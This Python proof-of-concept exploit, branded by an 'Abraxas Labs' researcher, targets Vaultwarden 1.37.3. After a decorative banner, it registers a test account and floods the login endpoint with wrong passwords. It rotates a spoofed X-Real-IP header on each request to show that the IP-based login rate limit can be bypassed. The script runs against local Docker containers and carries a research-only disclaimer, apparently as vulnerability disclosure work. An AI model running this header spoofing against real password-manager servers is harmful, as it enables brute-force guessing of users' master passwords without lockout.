#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: vaultwarden-ip-header-spoof (High: 7.5)
#  Vendor: Vaultwarden (dani-garcia)
#  Versions: Vaultwarden 1.37.3
#  Impact: unique X-Real-IP bypasses IP-keyed login rate limits on Docker NAT
#  Requires: loopback vaultwarden/server:1.37.3 Docker published-port
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "vaultwarden-ip-header-spoof"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: default X-Real-IP trusted-local bypasses login IP governor."""

import json
import os
import subprocess
import urllib.error
import urllib.parse
import urllib.request
import uuid

WITNESS = "VAULTWARDEN-IP-HEADER-SPOOF-WITNESS"
LABEL = "VAULTWARDEN-IP-HEADER-SPOOF"
VW = os.environ.get("VW_URL", "http://127.0.0.1:18170").rstrip("/")
VW_NONE = os.environ.get("VW_NONE_URL", "http://127.0.0.1:18171").rstrip("/")
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "vaultwarden-ip-header-spoof")
HERE = os.path.dirname(os.path.abspath(__file__))
EMAIL = "user@lab.invalid"
BURST = 14
DUMMY_KEY = "0.dGVzdA=="
LONG_KEY = (
    "0.dGVzdGhhc2h0ZXN0aGFzaHRlc3Q=|"
    "dGVzdGhhc2h0ZXN0aGFzaHRlc3RoYXNodGVzdA==|"
    "dGVzdGhhc2h0ZXN0aGFzaHRlc3RoYXNodGVzdGhhc2g="
)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def sanitize(text: str) -> str:
    out = text.replace("\n", " ").replace("\r", " ")
    return out[:240]


def http(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    form: dict[str, str] | None = None,
    json_body: dict | None = None,
    timeout: int = 20,
) -> tuple[int, str]:
    hdrs = {"Accept": "application/json"}
    if headers:
        hdrs.update(headers)
    data = None
    if json_body is not None:
        data = json.dumps(json_body).encode("utf-8")
        hdrs["Content-Type"] = "application/json"
    elif form is not None:
        data = urllib.parse.urlencode(form).encode("utf-8")
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
            return int(resp.status), body
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        return int(exc.code), body
    except Exception as exc:
        return 0, sanitize(str(exc))


def register_body(key: str) -> dict:
    return {
        "email": EMAIL,
        "name": "lab",
        "masterPasswordHash": "dGVzdGhhc2g=",
        "key": key,
        "kdf": 0,
        "kdfIterations": 600000,
    }


def register(base: str) -> None:
    url = f"{base}/identity/accounts/register"
    status, body = http(url, method="POST", json_body=register_body(DUMMY_KEY))
    if status in (200, 201):
        log(f"IOC register-ok host={base} status={status}")
        return
    if status in (400, 409, 422) and "already exists" in body.lower():
        log(f"IOC register-exists host={base} status={status}")
        return
    if status in (400, 422):
        status2, body2 = http(url, method="POST", json_body=register_body(LONG_KEY))
        if status2 in (200, 201):
            log(f"IOC register-ok-longkey host={base} status={status2}")
            return
        if status2 in (400, 409, 422) and "already exists" in body2.lower():
            log(f"IOC register-exists host={base} status={status2}")
            return
        fail(f"register failed host=loopback status={status}/{status2} body={sanitize(body2 or body)}")
    fail(f"register failed host=loopback status={status} body={sanitize(body)}")


def login_form() -> dict[str, str]:
    return {
        "grant_type": "password",
        "client_id": "web",
        "password": "wrong-password",
        "scope": "api offline_access",
        "username": EMAIL,
        "device_identifier": str(uuid.uuid4()),
        "device_name": "lab",
        "device_type": "9",
    }


def login(base: str, extra_headers: dict[str, str] | None = None) -> int:
    status, _body = http(
        f"{base}/identity/connect/token",
        method="POST",
        form=login_form(),
        headers=extra_headers,
    )
    return status


def dump_vw_logs() -> str:
    try:
        proc = subprocess.run(
            ["docker", "compose", "-p", COMPOSE, "logs", "--no-color", "--tail", "80", "vw"],
            cwd=HERE,
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )
    except Exception:
        return "no-logs"
    hits = []
    for line in (proc.stdout or "").splitlines():
        if any(tok in line for tok in ("IP:", "X-Real-IP", "trusted", "Ignoring", "login request")):
            hits.append(sanitize(line))
    if not hits:
        return "no-ip-lines"
    return " | ".join(hits[-6:])[:400]


def burst_until_429(base: str, extra_headers_fn=None) -> tuple[int, int]:
    first_429 = 0
    last_status = 0
    for i in range(1, BURST + 1):
        headers = extra_headers_fn(i) if extra_headers_fn else None
        last_status = login(base, headers)
        if last_status == 429 and first_429 == 0:
            first_429 = i
            break
    return first_429, last_status


def main() -> None:
    register(VW)
    register(VW_NONE)

    nohdr_429_at, nohdr_last = burst_until_429(VW)
    log(f"IOC nohdr-429-at={nohdr_429_at} nohdr-last-status={nohdr_last}")
    if nohdr_429_at == 0:
        fail(f"no 429 without header last-status={nohdr_last} logs={dump_vw_logs()}")

    spoof_400 = 0
    spoof_429 = 0
    spoof_other = 0
    spoof_last = 0
    for n in range(1, BURST + 1):
        spoof_last = login(VW, {"X-Real-IP": f"198.51.100.{n}"})
        if spoof_last == 400:
            spoof_400 += 1
        elif spoof_last == 429:
            spoof_429 += 1
        else:
            spoof_other += 1
    log(f"IOC spoof-400={spoof_400} spoof-429={spoof_429} spoof-other={spoof_other}")
    if spoof_429 != 0:
        fail(
            f"spoofed X-Real-IP still 429 spoof-400={spoof_400} spoof-429={spoof_429} "
            f"spoof-other={spoof_other} last={spoof_last} logs={dump_vw_logs()}"
        )
    if spoof_400 != BURST or spoof_other != 0:
        fail(
            f"spoofed X-Real-IP not all 400 spoof-400={spoof_400} spoof-429={spoof_429} "
            f"spoof-other={spoof_other} last={spoof_last}"
        )

    def none_headers(n: int) -> dict[str, str]:
        return {"X-Real-IP": f"203.0.113.{n}"}

    none_429_at, none_last = burst_until_429(VW_NONE, none_headers)
    log(f"IOC none-429-at={none_429_at} none-last-status={none_last}")
    if none_429_at == 0:
        fail(f"IP_HEADER=none never 429 last-status={none_last}")

    success(
        f"nohdr-429-at={nohdr_429_at} spoof-400={spoof_400} spoof-429={spoof_429} none-429-at={none_429_at}"
    )


if __name__ == "__main__":
    main()

